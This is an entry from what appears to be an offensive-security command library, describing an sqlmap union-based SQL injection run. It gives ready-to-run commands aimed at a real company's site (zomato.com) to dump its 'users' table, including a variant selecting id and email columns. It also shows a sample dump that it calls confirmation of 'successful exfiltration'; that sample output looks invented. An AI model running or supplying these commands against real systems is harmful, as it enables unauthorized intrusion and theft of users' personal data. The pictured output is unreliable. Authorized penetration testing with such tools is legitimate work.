---
id: cmd-258582-sqlmap-union
data: >-
  sqlmap -u "https://www.zomato.com/endpoint?param=*" --dbms=mysql --technique=U
  --dump -T users
tags:
  - sqli
  - data-extraction
  - union-based
type: command
output: |-
  Database: zomato_db
  Table: users
  [1 entry]
  +----+----------+
  | id | email    |
  +----+----------+
  | 1  | user@ex.com |
  +----+----------+
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.031Z'
verified: false
validated: true
submitted: true
---
# sqlmap-union-extract

## Command

```bash
sqlmap -u "https://www.zomato.com/endpoint?param=*" --dbms=mysql --technique=U --dump -T users
```

## Description

Uses sqlmap to perform union-based SQL injection and dump data from specified tables, assuming MySQL backend and prior vulnerability confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL | Yes |
| `--dbms` | Specify database type (e.g., mysql) | No |
| `--technique=U` | Use union-based injection only | Yes |
| `--dump` | Dump database content | Yes |
| `-T` | Target table name | Yes |

## Examples

### Basic Usage

```bash
sqlmap -u "https://target.com/page?id=*" --technique=U --dbs
```

### Advanced Usage

```bash
sqlmap -u "https://www.zomato.com/endpoint?param=*" --dbms=mysql --technique=U --dump -T users -C id,email --start=1 --stop=10
```

## Expected Output

Tabular dump of table data, e.g., rows from users table showing IDs and emails, confirming successful exfiltration.

## Related

- [[Related Procedure: Exploit-Union-Based-SQL-Injection]]
- [[commands/sqlmap-waf-bypass]]
